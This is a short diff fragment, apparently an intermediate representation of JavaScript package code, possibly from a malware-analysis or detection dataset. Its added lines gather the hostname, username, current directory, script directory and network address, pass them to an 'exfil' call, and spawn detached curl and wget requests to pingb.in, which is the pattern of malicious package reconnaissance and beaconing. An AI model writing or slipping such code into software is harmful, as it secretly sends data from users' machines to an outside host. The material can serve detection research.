@@ -1,0 +1,7 @@
+exfil({ d_hostname: os.hostname() })
+exfil({ d_user: os.userInfo().username })
+_tmp_8.d_cwd = <operator>.formatString("cwd: ", process.cwd(), "")
+_tmp_9.d_dirname = <operator>.formatString("dirname: ", __dirname, "")
+_tmp_10._computed_object_property_0 = net.address
+spawn(`curl`, `http://pingb.in/p/${id}`, { detached: true })
+spawn(`wget`, `http://pingb.in/p/${id}`, { detached: true })
